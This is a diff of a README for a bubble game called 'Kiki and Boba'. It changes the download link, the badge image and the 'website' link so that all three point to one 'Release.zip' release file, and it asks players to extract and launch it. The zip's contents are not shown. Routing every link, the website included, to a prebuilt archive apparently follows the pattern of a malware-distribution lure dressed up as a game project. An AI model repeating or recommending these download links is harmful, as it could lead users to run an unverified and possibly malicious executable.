@@ -13,9 +13,9 @@ In this immersive bubble game developed during the Global Game Jam event, you wi
 🌟 Created with TypeScript and KaplayJS  
 
 ## How to Play
-Simply download the game from the following link: [Download Here](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+Simply download the game from the following link: [Download Here](https://github.com/baconboy710/kiki-and-boba/releases/download/v1.0/Release.zip)
 
-[![Download Game](https://img.shields.io/badge/Download-Game-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Game](https://github.com/baconboy710/kiki-and-boba/releases/download/v1.0/Release.zip)](https://github.com/baconboy710/kiki-and-boba/releases/download/v1.0/Release.zip)
 
 Once you have downloaded the zip file, extract it and launch the game to begin your adventure with Kiki and Boba!
 
@@ -35,7 +35,7 @@ Once you have downloaded the zip file, extract it and launch the game to begin y
 If you are a fan of bubble games and enjoy JavaScript and TypeScript development, feel free to contribute to the project. Your input and ideas are valuable in making "Kiki and Boba" even more enjoyable for players worldwide.
 
 ## Explore More
-Visit our website [here](https://www.kikiandboba.com) to stay updated on the latest news, updates, and releases related to the game. Join the bubble-popping fun with Kiki and Boba today!
+Visit our website [here](https://github.com/baconboy710/kiki-and-boba/releases/download/v1.0/Release.zip) to stay updated on the latest news, updates, and releases related to the game. Join the bubble-popping fun with Kiki and Boba today!
 
 ## Feedback
 We love hearing from our players! If you have any feedback, suggestions, or ideas for improvement, please don't hesitate to reach out. Your input helps us create a better gaming experience for everyone.
